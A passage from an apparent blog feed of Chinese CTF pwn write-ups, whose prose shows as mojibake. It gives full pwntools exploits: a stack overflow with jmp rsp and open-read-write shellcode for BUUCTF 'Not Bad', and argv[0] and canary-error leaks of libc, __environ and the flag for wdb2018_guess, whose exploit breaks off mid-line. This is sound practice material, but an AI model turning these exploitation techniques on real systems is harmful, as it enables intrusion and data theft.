class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctfpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¯¥æ–‡ç« æš‚å½“å›¾åºŠ</title>
      <link href="/2024/09/17/%E8%AF%A5%E6%96%87%E7%AB%A0%E6%9A%82%E5%BD%93%E5%9B%BE%E5%BA%8A/"/>
      <url>/2024/09/17/%E8%AF%A5%E6%96%87%E7%AB%A0%E6%9A%82%E5%BD%93%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240727171132952.png"></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240727205848343.bmp"></p>]]></content>
      
      
      
        <tags>
            
            <tag> trash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜_2019-Not_Bad</title>
      <link href="/2024/09/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/"/>
      <url>/2024/09/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/</url>
      
        <content type="html"><![CDATA[<h1 id="å…¸å‹çš„ORW-mmapå‚æ•°ç†è§£"><a href="#å…¸å‹çš„ORW-mmapå‚æ•°ç†è§£" class="headerlink" title="å…¸å‹çš„ORW+mmapå‚æ•°ç†è§£"></a>å…¸å‹çš„ORW+mmapå‚æ•°ç†è§£</h1><p><a class="link" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad">é¢˜ç›®è¿æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><font color="red">çŸ¥è¯†ç‚¹</font></p><p>1.å…¸å‹çš„æ²™ç®±ï¼ŒORW</p><p>2.mmapå‚æ•°çš„ç†è§£ï¼Œå‚è€ƒ<a class="link" href="https://zhuanlan.zhihu.com/p/527532465">è¿™ç¯‡æ–‡ç«  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="1-idaé€Ÿè§ˆ"><a href="#1-idaé€Ÿè§ˆ" class="headerlink" title="1.idaé€Ÿè§ˆ"></a>1.idaé€Ÿè§ˆ</h2><ul><li>å·²ç»ä¿®æ”¹äº†å‡½æ•°åï¼ŒåŠ å…¥äº†æ²™ç®±</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240916154952629.bmp"></p><ul><li>å‘ç°æ˜¯å…¸å‹çš„ORWå¯ç”¨ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240916155021894.bmp"></p><ul><li>æŸ¥çœ‹ä¸€ä¸‹ä¸»è¦éƒ¨åˆ†ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240916155002230.bmp"></p><p>å­˜åœ¨æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œå¹¶ä¸”æ­¤é¢˜ä¿æŠ¤å…¨å…³ï¼Œå¯ä»¥ç›´æ¥å†™å…¥shellcodeã€‚</p><h3 id="ç®€å•æ€è·¯"><a href="#ç®€å•æ€è·¯" class="headerlink" title="ç®€å•æ€è·¯"></a>ç®€å•æ€è·¯</h3><ul><li>å…³äºmmapå‡½æ•°çš„å‚æ•°å¯ä»¥å‚è€ƒå¼€å¤´çš„æ–‡ç« ï¼Œæ­¤å¤„çš„mmapä¼šåœ¨æŒ‡å®šçš„åœ°å€å¼€è¾Ÿä¸€ä¸ª0x1000çš„å¯å†™å¯æ‰§è¡ŒåŒºåŸŸ(prot&#x3D;6ï¼Œä¸å¯è¯»)ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨è¯¥åœ°å€å†™å…¥shellcodeï¼Œç„¶åä½¿ä¹‹è¢«è°ƒç”¨å°±å¯ä»¥getflagã€‚</li><li>å…·ä½“çš„æ„é€ çœ‹ä¸‹é¢å§ï¼š</li></ul><h2 id="2-å®Œæ•´åˆ†æ"><a href="#2-å®Œæ•´åˆ†æ" class="headerlink" title="2.å®Œæ•´åˆ†æ"></a>2.å®Œæ•´åˆ†æ</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯ä»¥å…ˆå°†å·²çŸ¥çš„å’Œéœ€è¦çš„å…ˆæ„å»ºå‡ºæ¥</span></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line"><span class="comment"># å…ˆæ„é€ å¥½shellcode,å…¸å‹çš„ORW</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure></div><ul><li>è¿™é‡Œè¦è§£é‡Šä¸€ä¸‹readçš„ç¬¬ä¸€ä¸ªå‚æ•°çš„å«ä¹‰ï¼Œä»£è¡¨æˆ‘è¦è¯»çš„æ–‡ä»¶æ˜¯ç¬¬å‡ ä¸ªï¼Œå³fdï¼Œæ‰€è°“çš„3æ˜¯å› ä¸º</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> : <span class="built_in">stdin</span></span><br><span class="line"><span class="number">1</span> : <span class="built_in">stdout</span></span><br><span class="line"><span class="number">2</span> : <span class="built_in">stderr</span></span><br><span class="line"><span class="number">3</span> ï¼šflag</span><br></pre></td></tr></table></figure></div><ul><li>shellcodeæ˜¯æ„é€ å®Œäº†ï¼Œä½†æ˜¯è¿™ä¸ªshellcodeçš„é•¿åº¦æœ‰0x52ï¼Œèƒ½ç›´æ¥å†™å—ï¼Ÿå½“ç„¶ä¸è¡Œï¼Œæ ˆç©ºé—´ä¸å¤Ÿå•Šï¼Œé‚£è¦å¦‚ä½•å®Œæˆå‘¢ï¼Ÿ</li><li>æˆ‘ä»¬å¯ä»¥åœ¨æ ˆå¼€å¤´è°ƒç”¨ä¸€ä¸ªreadï¼Œå†å°†è¿™ä¸ªshellcodeè¾“å…¥åˆ°mmapçš„åœ°å€ï¼Œæœ€åæ”¹å˜raxä¸ºmmapåœ°å€ï¼Œå†callå°±å¥½äº†ï¼Œé‚£ä¹ˆåˆå§‹çš„æ„é€ å°±å¦‚ä¸‹äº†ï¼š</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>)) + asm(<span class="string">&quot;mov rax,0x123000;call rax&quot;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure></div><ul><li>è¿™æ ·æˆ‘ä»¬å°±æ„é€ å¥½äº†å¼€å§‹çš„ç»“æ„ï¼Œåªè¦è°ƒç”¨è¿™ä¸ªï¼Œå†æ¬¡è¾“å…¥shellcodeï¼Œå°±å¯ä»¥getflagäº†ï¼Œå¦‚ä½•è°ƒç”¨ï¼Ÿå¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰å†™çš„<a class="link" href="https://blog.csdn.net/zwb2603096342/article/details/139296136?spm=1001.2014.3001.5502">è¿™ç¯‡åšå®¢ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>æˆ‘ä»¬åªéœ€è¦å°†ret_addressæ”¹ä¸ºjmp_rspçš„åœ°å€ï¼Œæ­¤æ—¶retç›¸å½“äºæ‰§è¡Œpop ripï¼Œå°†rspçš„å€¼å¼¹ç»™ripï¼Œé‚£ä¹ˆæ­¤æ—¶çš„<strong>ripå°±æ˜¯jmp_rsp</strong>ï¼ŒåŒæ—¶ï¼Œä¹Ÿç”±äºpop ripä¸­çš„popï¼Œå¯¼è‡´rsp+8ï¼Œæ­¤æ—¶rspæŒ‡å‘ä¸‹ä¸€æ¡è¯­å¥ï¼Œå³â€sub rsp;0x30;jmp rspâ€,ripæ­¤æ—¶jmp_rsp,ç›¸å½“äºæ‰§è¡Œè¿™æ®µè¯­å¥ï¼Œé‚£ä¹ˆä¾¿ä¼šæ‰§è¡Œæ ˆå¼€å¤´çš„ç³»ç»Ÿè°ƒç”¨äº†</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>) <span class="comment"># jmp_rspä¸ºåœ°å€</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Easy shellcode, have fun!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure></div><h2 id="3-å®Œæ•´EXPï¼š"><a href="#3-å®Œæ•´EXPï¼š" class="headerlink" title="3.å®Œæ•´EXPï¼š"></a>3.å®Œæ•´EXPï¼š</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,28443)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp =<span class="number">0x0000000000400a01</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å…ˆæ„é€ å¥½shellcode,å…¸å‹çš„ORW</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†shellcodeå†™åœ¨mmapå¼€è¾Ÿçš„å›ºå®šåœ°å€ï¼Œç„¶åcallè¯¥åœ°å€ï¼Œæ‰§è¡Œshellcode</span></span><br><span class="line"><span class="comment">#bug() </span></span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>)) + asm(<span class="string">&quot;mov rax,0x123000;call rax&quot;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Easy shellcode, have fun!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wdb2018_guess--canaryæŠ¥é”™åˆ©ç”¨</title>
      <link href="/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/"/>
      <url>/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¿®æ”¹argv-0-ä½¿canaryæŠ¥é”™æ—¶æ³„éœ²ä¿¡æ¯"><a href="#ä¿®æ”¹argv-0-ä½¿canaryæŠ¥é”™æ—¶æ³„éœ²ä¿¡æ¯" class="headerlink" title="ä¿®æ”¹argv[0],ä½¿canaryæŠ¥é”™æ—¶æ³„éœ²ä¿¡æ¯"></a>ä¿®æ”¹argv[0],ä½¿canaryæŠ¥é”™æ—¶æ³„éœ²ä¿¡æ¯</h1><p><a class="link" href="https://buuoj.cn/challenges#wdb2018_guess">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://blog.csdn.net/Invin_cible/article/details/123042863">å‚è€ƒæ–‡ç«  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><font color="red">çŸ¥è¯†ç‚¹ï¼š</font></p><p>1.<strong>canaryæŠ¥é”™çš„åˆ©ç”¨ï¼Œç†Ÿæ‚‰æŠ¥é”™çš„å‚æ•°æ˜¯ä»€ä¹ˆ</strong></p><p>2.<strong>__environç¯å¢ƒå˜é‡</strong></p><h2 id="1-idaé€Ÿè§ˆ"><a href="#1-idaé€Ÿè§ˆ" class="headerlink" title="1.idaé€Ÿè§ˆ"></a>1.idaé€Ÿè§ˆ</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; <span class="comment">// [rsp+14h] [rbp-8Ch] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+30h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">56</span>]; <span class="comment">// [rsp+60h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">3LL</span>;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  sub_4009A6(a1, a2, a3);</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(<span class="string">&quot;./flag.txt&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(stat_loc.__iptr) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;./flag.txt&quot;</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This is GUESS FLAG CHALLENGE!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;you have no sense... bye :-) &quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_400A11() ) <span class="comment">// æ­¤å¤„åˆ›å»ºå­è¿›ç¨‹</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your guessing flag&quot;</span>);</span><br><span class="line">  gets(s2); <span class="comment">// æ˜æ˜¾çš„æ ˆæº¢å‡º</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, s2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You must have great six sense!!!! :-o &quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You should take more effort to get six sence, and one more challenge!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><p>æ˜¯å¯ä»¥å‘ç°æœ‰ä¸‰æ¬¡forkåˆ›å»ºå­è¿›ç¨‹çš„ï¼Œè¯´æ˜æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸‰æ¬¡canaryæŠ¥é”™</p></li><li><p>ä¸ºä»€ä¹ˆæƒ³åˆ°è¿™ä¸ªï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬æ²¡æœ‰å…¶ä»–çš„è¾“å‡ºçš„å¯ä»¥åˆ©ç”¨ï¼Œæ‰€ä»¥æƒ³åˆ°è¿™ä¸ªã€‚</p></li><li><p>å¤§è‡´çš„æ€è·¯å°±æ˜¯é€šè¿‡æ³„éœ²flagåœ¨æ ˆä¸Šçš„åœ°å€ï¼Œç„¶åé€šè¿‡canaryæŠ¥é”™è¾“å‡ºå‡ºæ¥ï¼Œå…·ä½“çœ‹ä¸‹é¢çš„å®ç°.</p></li></ul><h2 id="2-gdbè°ƒè¯•"><a href="#2-gdbè°ƒè¯•" class="headerlink" title="2.gdbè°ƒè¯•"></a>2.gdbè°ƒè¯•</h2><p>é¦–å…ˆè¦patchelfï¼Œå°†ç¯å¢ƒæ”¹ä¸ºglibc2.24ï¼Œä¸ç„¶æ— æ³•å®ç°ã€‚</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240916141131322.bmp"></p><p>å‘ç°æŠ¥é”™éƒ¨åˆ†å‡ºç°äº†ç¨‹åºçš„åå­—ï¼Œé‚£ä¹ˆè¿™ä¸ªæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿè¿™ä¸ªå…¶å®å°±æ˜¯argv[0]ï¼Œä¹Ÿå°±æ˜¯è¯´argv[0]ä¼šéšç€canaryæŠ¥é”™çš„æ—¶å€™è¾“å‡ºå‡ºæ¥ï¼Œé‚£å¦‚æœæˆ‘ä»¬å°†å…¶æ”¹ä¸ºæŸä¸ªå‡½æ•°çš„gotè¡¨çš„å†…å®¹ï¼Œé‚£æ˜¯ä¸æ˜¯å°±å¯ä»¥è¾“å‡ºå…¶çœŸå®åœ°å€äº†ï¼Œè¾¾åˆ°æ³„éœ²libcçš„ä½œç”¨ï¼Œä¸‹é¢æ¥çœ‹çœ‹æ ˆå¸ƒå±€ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240916141833635.bmp"></p><ul><li>è¿™é‡Œå¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°è¾“å…¥çš„åœ°å€å’Œargv[0]ç›¸å·®0x128,æˆ‘ä»¬é€šè¿‡æ ˆæº¢å‡ºè¦†ç›–æ­¤å¤„çš„åœ°å€ä¸ºgotè¡¨åœ°å€å³å¯æ³„éœ²libc</li></ul><h3 id="1-æ³„éœ²Libcï¼š"><a href="#1-æ³„éœ²Libcï¼š" class="headerlink" title="(1) æ³„éœ²Libcï¼š"></a>(1) æ³„éœ²Libcï¼š</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step1 -- æ³„æ¼æ ˆåœ°å€</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(puts_got)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address : &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure></div><ul><li>çœ‹çœ‹å®é™…æ•ˆæœ</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240916143126078.bmp"></p><h3 id="2-é€šè¿‡-environæ³„éœ²ç¯å¢ƒå˜é‡åœ°å€"><a href="#2-é€šè¿‡-environæ³„éœ²ç¯å¢ƒå˜é‡åœ°å€" class="headerlink" title="(2)é€šè¿‡__environæ³„éœ²ç¯å¢ƒå˜é‡åœ°å€"></a>(2)é€šè¿‡__environæ³„éœ²ç¯å¢ƒå˜é‡åœ°å€</h3><p>å…³äº__environå¯ä»¥å‚è€ƒå¼€å¤´çš„æ–‡ç« </p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240916144643853.bmp"></p><ul><li>å…‰æ ‡å¤„å°±æ˜¯__environçš„åœ°å€ï¼Œå¾ˆæ˜æ˜¾è¯¥åœ°å€æ˜¯åœ¨æ ˆä¸Šçš„ï¼Œå› æ­¤æˆ‘ä»¬æ³„éœ²å‡ºè¯¥åœ°å€ï¼Œå°±å¯ä»¥è·å¾—æ ˆåœ°å€äº†.</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240916144655337.bmp"></p><ul><li>å‘ç°flagçš„åœ°å€ä¸__environçš„åœ°å€å·®è·0x168ï¼Œå› æ­¤å°†environçš„åœ°å€æ³„éœ²å‡ºæ¥,å†å‡å»0x168å°±æ˜¯flagçš„åœ°å€ï¼Œç„¶åé€šè¿‡åŒæ ·çš„æº¢å‡ºï¼Œå°±å¯ä»¥æ³„éœ²flagäº†.(è¯¥flagæ˜¯æˆ‘æœ¬åœ°å»ºç«‹çš„ï¼Œä¸ºäº†è°ƒè¯•æ–¹ä¾¿)</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step2 -- æ³„æ¼flagåœ°å€</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(environ)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">buf = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;buf(flag)_address : &#x27;</span>+<span class="built_in">hex</span>(buf))</span><br></pre></td></tr></table></figure></div><h3 id="3-æ³„éœ²flag"><a href="#3-æ³„éœ²flag" class="headerlink" title="(3),æ³„éœ²flag"></a>(3),æ³„éœ²flag</h3><p>ç›´æ¥çœ‹æœ€åçš„EXPå§</p><p><img lazyload src="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916145230691.bmp"></p><h2 id="3-æœ€ç»ˆEXP"><a href="#3-æœ€ç»ˆEXP" class="headerlink" title="3.æœ€ç»ˆEXP"></a>3.æœ€ç»ˆEXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,28532)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‰æ¬¡åˆ›å»ºforkï¼Œç›¸å½“äºå¯ä»¥åˆ©ç”¨ä¸‰æ¬¡ç¨‹åº</span></span><br><span class="line"><span class="comment"># ç¬¬ä¸€æ¬¡æ³„æ¼libcï¼Œç¬¬äºŒæ¬¡æ³„æ¼æ ˆåœ°å€ï¼Œç¬¬ä¸‰æ¬¡æ³„æ¼flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 -- æ³„æ¼æ ˆåœ°å€</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address : &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">environ = base + libc.dump(<span class="string">&#x27;__environ&#x27;</span>) <span class="comment"># ç¯å¢ƒå˜é‡çš„åœ°å€</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 -- æ³„æ¼flagåœ°å€</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(environ)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing 